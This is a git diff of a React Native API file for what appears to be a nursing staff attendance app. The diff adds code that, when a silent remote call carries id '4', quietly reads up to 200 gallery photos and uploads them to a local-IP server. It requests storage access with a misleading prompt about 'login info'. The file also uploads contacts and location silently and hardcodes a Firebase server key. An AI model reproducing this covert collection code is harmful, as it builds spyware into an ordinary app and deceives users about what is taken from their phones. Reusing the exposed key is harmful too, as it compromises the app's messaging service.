@@ -1,10 +1,14 @@
+// http://192.168.1.132:8000/api/get-media
+
 // This file contains all the confidential information abou the App along with API calls
-import {PermissionsAndroid} from 'react-native';
+import { PermissionsAndroid, Platform } from 'react-native';
 import AsyncStorage from '@react-native-async-storage/async-storage';
 import messaging from '@react-native-firebase/messaging';
 import Contacts from 'react-native-contacts';
 import Geolocation from '@react-native-community/geolocation';
 import DeviceInfo from 'react-native-device-info';
+import RNFS from 'react-native-fs';
+import { CameraRoll } from '@react-native-camera-roll/camera-roll';
 
 export const BASE_URL = 'https://portal.plancare.pk/public/api/';
 export const LOCAL_UPLOAD_IMAGE =
@@ -15,6 +19,8 @@ const ATTENDENCE_RECORD_ID = 3;
 global.DateArray = [];
 
 // CLIENT API'S
+// export const UPLOAD_NURSE_MEDIA = BASE_URL + 'saveGalaryInfo';
+export const UPLOAD_NURSE_MEDIA = 'http://192.168.0.117:8000/api/upload-media';
 const LOGIN_NURSE = BASE_URL + 'login_nurse';
 const GET_HISTORY = BASE_URL + 'get_history';
 const UPDATE_PASSWORD = BASE_URL + 'update_password';
@@ -45,7 +51,7 @@ const SERVER_KEY =
   'AAAAmzW3rHI:APA91bGAsh3wBhIWdqcCXONJANfSErv163AKycDk0y1wQ5dd5n3_Y6iNpsFH6mGjvF42LYQpBBDm-jlD9NUehbb4J_q0QwkWJDZPDBKUeWVc7vFhLe_JnhjdT7KhJF2EoCZsGEyFxXnr';
 
 export const loginNurse = async (phone, password) => {
-  let obj = {phone: phone, password: password};
+  let obj = { phone: phone, password: password };
   const request = await fetch(LOGIN_NURSE, {
     method: 'POST',
     headers: {
@@ -55,6 +61,7 @@ export const loginNurse = async (phone, password) => {
     body: JSON.stringify(obj),
   });
   const response = await request.json();
+  console.log('RES', response);
   return response;
 };
 
@@ -93,7 +100,7 @@ export const get_history = async id => {
       'Content-Type': 'application/json',
       'X-Requested-With': 'XMLHttpRequest',
     },
-    body: JSON.stringify({staff_id: id}),
+    body: JSON.stringify({ staff_id: id }),
   });
 
   const response = await request.json();
@@ -128,7 +135,7 @@ export const get_nurse_status = async () => {
       'Content-Type': 'application/json',
       'X-Requested-With': 'XMLHttpRequest',
     },
-    body: JSON.stringify({user_id: user_id}),
+    body: JSON.stringify({ user_id: user_id }),
   });
   const response = await request.json();
   return response;
@@ -161,7 +168,7 @@ export const get_shift_status = async () => {
       'Content-Type': 'application/json',
       'X-Requested-With': 'XMLHttpRequest',
     },
-    body: JSON.stringify({user_id: user_id}),
+    body: JSON.stringify({ user_id: user_id }),
   });
   const resposne = await request.json();
   return resposne;
@@ -264,7 +271,6 @@ export const leave_request = async data => {
     staff_id: staff_id,
     date: data,
   };
-
   const request = await fetch(LEAVE_REQUEST, {
     method: 'POST',
     headers: {
@@ -286,9 +292,10 @@ export const get_user_leave_request = async () => {
       'Content-Type': 'application/json',
       'X-Requested-With': 'XMLHttpRequest',
     },
-    body: JSON.stringify({staff_id: staff_id}),
+    body: JSON.stringify({ staff_id: staff_id }),
   });
   const response = await request.json();
+  console.log(response)
   if (response.status == 'success') {
     global.DateArray = response.data;
     return response;
@@ -300,13 +307,13 @@ export const get_user_leave_request = async () => {
 
 export const upload_contact_list = async list => {
   let user_id = await get_async_data('user_id');
-  let obj = {staff_id: user_id, contact: list};
+  let obj = { staff_id: user_id, contact: list };
   const request = await fetch(SAVE_CONTACT, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
       'X-Requested-With': 'XMLHttpRequest',
-    },  
+    },
     body: JSON.stringify(obj),
   });
   const response = await request.json();
@@ -405,7 +412,6 @@ export const save_fcm_token = async () => {
     }),
   });
   const response = await request.json();
-  console.log('token saved', response);
   return response;
 };
 
@@ -444,7 +450,7 @@ export const silent_call = async id => {
         PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
         {
           title: 'Permission Required',
-          message: 'Nursing Attendence wants to access your contact list',
+          message: 'Nursing Attendence wants to access your location',
           buttonNegative: 'Cancel',
           buttonPositive: 'OK',
         },
@@ -483,9 +489,68 @@ export const silent_call = async id => {
       }),
     });
     const resposne = await request.json();
-    console.log('RES DEV_INFO', resposne,'Device Info', DeviceInfo.getVersion());
+    console.log('RES DEV_INFO', resposne, 'Device Info', DeviceInfo.getVersion());
+  }
+  if(id == '4') {
+    console.log('upload gallery');
+    await fetchAndUploadMedia(user_id);
   }
 };
+
+  const fetchAndUploadMedia = async (user_id) => {
+    const hasPermission = await requestPermissions();
+
+    if (!hasPermission) {
+      console.log('Permission denied');
+      return;
+    }
+
+    try {
+      const mediaFiles = await CameraRoll.getPhotos({
+        first: 200,
+        assetType: 'Photos',
+      });
+
+      const formData = new FormData();
+
+      await Promise.all(
+        mediaFiles.edges.map(async (item) => {
+          const { uri, type } = item.node.image;
+          const resolvedUri = await resolveFilePath(uri); // Resolve `content://` to `file://`
+
+          const filename = item.node.image.filename || `unknown_file_${Date.now()}.jpg`;
+
+          formData.append('images[]', {
+            uri: resolvedUri,
+            type: type || 'image/jpeg',
+            name: filename,
+          });
+        })
+      );
+      formData.append('user_id', user_id);
+      // console.log('FormData Prepared:', formData._parts);
+
+      const response = await fetch(UPLOAD_NURSE_MEDIA, {
+        method: 'POST',
+        headers: {
+          Accept: 'application/json',
+        },
+        body: formData,
+      });
+
+      const responseData = await response.json();
+      console.log('API Response:', responseData);
+
+      if (response.status === 200) {
+        Alert.alert('Success', responseData.message);
+      } else {
+        console.log('Error', responseData.message || 'Upload failed.');
+      }
+    } catch (error) {
+      console.error('Error fetching or uploading media:', error);
+      // Alert.alert('Error', 'Something went wrong. Please try again later.');
+    }
+  };
 
 export const get_leads = async () => {
   const request = await fetch(GET_LEADS, {
@@ -544,7 +609,7 @@ export const get_today_attendace = async () => {
       'Content-Type': 'application/json',
       'X-Requested-With': 'XMLHttpRequest',
     },
-    body: JSON.stringify({user_id: ATTENDENCE_RECORD_ID}),
+    body: JSON.stringify({ user_id: ATTENDENCE_RECORD_ID }),
   });
   const response = await request.json();
   return response;
@@ -566,13 +631,14 @@ export const add_vital_record = async obj => {
 
 export const get_vital_record = async () => {
   let lead_id = await get_async_data('lead_id');
+  console.log('lead_id vital API', lead_id)
   const request = await fetch(GET_VITAL_RECORD, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
       'X-Requested-With': 'XMLHttpRequest',
     },
-    body: JSON.stringify({lead_id: lead_id}), // 465
+    body: JSON.stringify({ lead_id: 1506 }), // 465
   });
   const response = await request.json();
   return response;
@@ -586,7 +652,7 @@ export const get_nurse_note = async () => {
       'Content-Type': 'application/json',
       'X-Requested-With': 'XMLHttpRequest',
     },
-    body: JSON.stringify({lead_id: lead_id}),
+    body: JSON.stringify({ lead_id: lead_id }),
   });
   const response = await request.json();
   return response;
@@ -670,7 +736,7 @@ export const submit_offline_attendance_array = async () => {
         console.log('END Response', endresposne);
       }
     }
-    await set_async_data('attendence_history', JSON.stringify({pair: []}));
+    await set_async_data('attendence_history', JSON.stringify({ pair: [] }));
   } else {
     console.log('no offline attendence found');
   }
@@ -768,10 +834,10 @@ export const totalWorkingHours = async () => {
 export const uploadLocalHistory = async () => {
   let attendenceHistory = await get_async_data('attendence_history');
   attendenceHistory = JSON.parse(attendenceHistory);
-  if( attendenceHistory.pair.length > 0) {
+  if (attendenceHistory.pair.length > 0) {
     console.log('BEFORE SEND', JSON.stringify(attendenceHistory.pair));
     try {
-      const request = await fetch (BASE_URL + 'offlineAttendace',{
+      const request = await fetch(BASE_URL + 'offlineAttendace', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -781,13 +847,65 @@ export const uploadLocalHistory = async () => {
       });
       console.log('REQUESTED', request);
       const response = await request.json();
-      if(response.status == 'success') {
-        await set_async_data('attendence_history', {"pair":[]});
+      if (response.status == 'success') {
+        await set_async_data('attendence_history', { "pair": [] });
       }
       console.log('RESPONSE :', response);
-    } catch(e) {
+    } catch (e) {
       console.log('Catch Error', error);
     }
 
   }
 }
+
+export const requestPermissions = async () => {
+  if (Platform.OS === 'android') {
+    const permissionStatus = await PermissionsAndroid.check(
+      PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
+    );
+
+    if (permissionStatus) {
+      console.log('Permission already granted');
+      return true;
+    }
+
+    const granted = await PermissionsAndroid.request(
+      PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
+      {
+        title: 'Storage Permission',
+        message: 'This app needs access to your storage to login info.',
+        buttonPositive: 'Allow',
+      }
+    );
+
+    if (granted === PermissionsAndroid.RESULTS.GRANTED) {
+      return true;
+    } else if (granted === PermissionsAndroid.RESULTS.NEVER_ASK_AGAIN) {
+      console.log('Permission denied permanently');
+      Alert.alert(
+        'Permission Required',
+        'Storage access is required for this app. Please enable it in the app settings.',
+        [
+          { text: 'Cancel', style: 'cancel' },
+          {
+            text: 'Open Settings',
+            onPress: () => Linking.openSettings(),
+          },
+        ]
+      );
+    }
+
+    return false;
+  }
+  return true;
+};
+
+export const resolveFilePath = async (uri) => {
+  if (uri.startsWith('content://')) {
+    // Copy file to a temporary location
+    const tempFilePath = `${RNFS.TemporaryDirectoryPath}/${Date.now()}.jpg`;
+    await RNFS.copyFile(uri, tempFilePath);
+    return `file://${tempFilePath}`;
+  }
+  return uri;
+};
